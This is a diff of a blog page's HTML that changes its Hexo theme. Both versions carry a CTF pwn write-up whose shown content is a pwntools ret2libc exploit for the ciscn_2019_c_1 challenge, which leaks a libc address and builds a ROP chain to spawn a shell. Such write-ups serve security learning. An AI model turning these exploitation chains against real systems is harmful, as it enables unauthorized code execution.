@@ -1,163 +1,385 @@
 <!DOCTYPE html>
-<html lang=en>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
 <head><meta name="generator" content="Hexo 3.9.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process(&apos;">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Apr1L's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF">
 <meta property="og:url" content="http://suvii22.github.io/2019/11/24/BUUCTF/index.html">
 <meta property="og:site_name" content="Apr1L&#39;s blog">
-<meta property="og:description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process(&apos;">
+<meta property="og:description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="https://i.loli.net/2020/02/11/RntCJ59W17LvDrk.png">
-<meta property="og:updated_time" content="2020-09-01T11:56:37.655Z">
+<meta property="og:updated_time" content="2020-09-18T06:10:10.959Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BUUCTF">
-<meta name="twitter:description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process(&apos;">
+<meta name="twitter:description" content="ciscn_2019_c_1&amp;amp;ciscn_2019_en_2123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from LibcSearcher import *#p = remote(&apos;node3.buuoj.cn&apos;,26936)p = process">
 <meta name="twitter:image" content="https://i.loli.net/2020/02/11/RntCJ59W17LvDrk.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>BUUCTF</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
-</head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2020/02/28/SUCTF2019-playfmt/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2019/11/04/Syc-Geek-10th/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://suvii22.github.io/2019/11/24/BUUCTF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://suvii22.github.io/2019/11/24/BUUCTF/&text=BUUCTF"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://suvii22.github.io/2019/11/24/BUUCTF/&is_video=false&description=BUUCTF"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=BUUCTF&body=Check out this article: http://suvii22.github.io/2019/11/24/BUUCTF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://suvii22.github.io/2019/11/24/BUUCTF/&title=BUUCTF"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://suvii22.github.io/2019/11/24/BUUCTF/&name=BUUCTF&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://suvii22.github.io/2019/11/24/BUUCTF/&t=BUUCTF"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1-amp-ciscn-2019-en-2"><span class="toc-number">1.</span> <span class="toc-text">ciscn_2019_c_1&amp;ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序"><span class="toc-number">2.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">2.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-started"><span class="toc-number">3.</span> <span class="toc-text">get_started</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyheap"><span class="toc-number">4.</span> <span class="toc-text">babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-1"><span class="toc-number">4.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#泄露libc基地址"><span class="toc-number">4.2.</span> <span class="toc-text">泄露libc基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-shell"><span class="toc-number">4.3.</span> <span class="toc-text">get shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#完整EXP"><span class="toc-number">4.4.</span> <span class="toc-text">完整EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN5"><span class="toc-number">5.</span> <span class="toc-text">PWN5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-8"><span class="toc-number">6.</span> <span class="toc-text">ciscn_2019_n_8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">6.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyfengshui"><span class="toc-number">7.</span> <span class="toc-text">babyfengshui</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-2"><span class="toc-number">7.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目思路"><span class="toc-number">7.2.</span> <span class="toc-text">题目思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">7.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-s-3"><span class="toc-number">8.</span> <span class="toc-text">ciscn_s_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-3"><span class="toc-number">8.1.</span> <span class="toc-text">分析程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">8.2.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考"><span class="toc-number">8.3.</span> <span class="toc-text">参考</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop"><span class="toc-number">9.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn2-sctf-2016"><span class="toc-number">10.</span> <span class="toc-text">pwn2_sctf_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-pz-hackover-2016"><span class="toc-number">11.</span> <span class="toc-text">ez_pz_hackover_2016</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-ne-5"><span class="toc-number">12.</span> <span class="toc-text">ciscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HarekazeCTF2019-baby-rop2"><span class="toc-number">13.</span> <span class="toc-text">[HarekazeCTF2019]baby_rop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">14.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-es-2"><span class="toc-number">15.</span> <span class="toc-text">ciscn_2019_es_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level0"><span class="toc-number">16.</span> <span class="toc-text">jarvisoj_level0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roarctf-2019-easy-pwn"><span class="toc-number">17.</span> <span class="toc-text">roarctf_2019_easy_pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-number">17.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">17.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2"><span class="toc-number">18.</span> <span class="toc-text">jarvisoj_level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level2-x64"><span class="toc-number">19.</span> <span class="toc-text">jarvisoj_level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">20.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-Login"><span class="toc-number">21.</span> <span class="toc-text">[ZJCTF 2019]Login</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-level3-x64"><span class="toc-number">22.</span> <span class="toc-text">jarvisoj_level3_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-3"><span class="toc-number">23.</span> <span class="toc-text">ciscn_2019_n_3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析-1"><span class="toc-number">23.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">23.2.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack"><span class="toc-number">24.</span> <span class="toc-text">bjdctf_2020_babystack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">25.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop2"><span class="toc-number">26.</span> <span class="toc-text">bjdctf_2020_babyrop2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-YDSneedGrirlfriend"><span class="toc-number">27.</span> <span class="toc-text">bjdctf_2020_YDSneedGrirlfriend</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">28.</span> <span class="toc-text">jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#axb-2019-fmt32"><span class="toc-number">29.</span> <span class="toc-text">axb_2019_fmt32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Black-Watch-入群题-PWN"><span class="toc-number">30.</span> <span class="toc-text">[Black Watch 入群题]PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmcc-simplerop"><span class="toc-number">31.</span> <span class="toc-text">cmcc_simplerop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-final-3"><span class="toc-number">32.</span> <span class="toc-text">ciscn_2019_final_3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZJCTF-2019-EasyHeap"><span class="toc-number">33.</span> <span class="toc-text">[ZJCTF 2019]EasyHeap</span></a></li></ol>
-    </div>
-  </span>
-</div>
-
-    
-    <div class="content index py4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        BUUCTF
-    </h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">Apr1L's blog</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2019-11-24T08:55:22.000Z" itemprop="datePublished">2019-11-24</time>
-        
-      
-    </div>
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
 
 
-      
-    <div class="article-category">
-        <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/pwn/">pwn</a> › <a class="category-link" href="/categories/pwn/wp/">wp</a>
-    </div>
+
+  <link rel="canonical" href="http://suvii22.github.io/2019/11/24/BUUCTF/">
 
 
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/pwn/">pwn</a>
-    </div>
 
 
-    </div>
-  </header>
+
+  <title>BUUCTF | Apr1L's blog</title>
   
 
-  <div class="content" itemprop="articleBody">
-    <h2 id="ciscn-2019-c-1-amp-ciscn-2019-en-2"><a href="#ciscn-2019-c-1-amp-ciscn-2019-en-2" class="headerlink" title="ciscn_2019_c_1&amp;ciscn_2019_en_2"></a>ciscn_2019_c_1&amp;ciscn_2019_en_2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',26936)</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(content)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">"Input your choice!"</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#binsh_addr = 0x000000000018cd57</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x50</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'@'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'gets_leak =&gt; &#123;&#125;'</span>.format(hex(puts_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#libc_base = puts_addr - libc.symbols['puts']</span></span><br><span class="line"><span class="comment">#one_gadget = libc_base+0x4526a</span></span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">binsh = libc.dump(<span class="string">'str_bin_sh'</span>) + libc_base</span><br><span class="line">ret =<span class="number">0x00000000004006b9</span> <span class="comment">#ret</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x50</span>+<span class="number">0x8</span>) + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system_addr)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?1492608f41d9f4aca00f135cccb18cda";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Apr1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Apr1L</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://suvii22.github.io/2019/11/24/BUUCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Apr1L">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Apr1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">BUUCTF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-24T16:55:22+08:00">
+                2019-11-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+                  , 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/wp/" itemprop="url" rel="index">
+                    <span itemprop="name">wp</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote class="blockquote-center"></blockquote>
+
+<h2 id="ciscn-2019-c-1-amp-ciscn-2019-en-2"><a href="#ciscn-2019-c-1-amp-ciscn-2019-en-2" class="headerlink" title="ciscn_2019_c_1&amp;ciscn_2019_en_2"></a>ciscn_2019_c_1&amp;ciscn_2019_en_2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn',26936)</span></span><br><span class="line">p = process(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ciscn_2019_c_1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(content)</span>:</span></span><br><span class="line">        p.recvuntil(<span class="string">"Input your choice!"</span>)</span><br><span class="line">        p.sendline(<span class="string">'1'</span>)</span><br><span class="line">        p.recvuntil(<span class="string">"Input your Plaintext to be encrypted\n"</span>)</span><br><span class="line">        p.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#binsh_addr = 0x000000000018cd57</span></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">gets_got = elf.got[<span class="string">'gets'</span>]</span><br><span class="line">main = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*(<span class="number">0x50</span>+<span class="number">0x8</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</span><br><span class="line"></span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'@'</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recvline()[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'gets_leak =&gt; &#123;&#125;'</span>.format(hex(puts_addr)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line"><span class="comment">#libc_base = puts_addr - 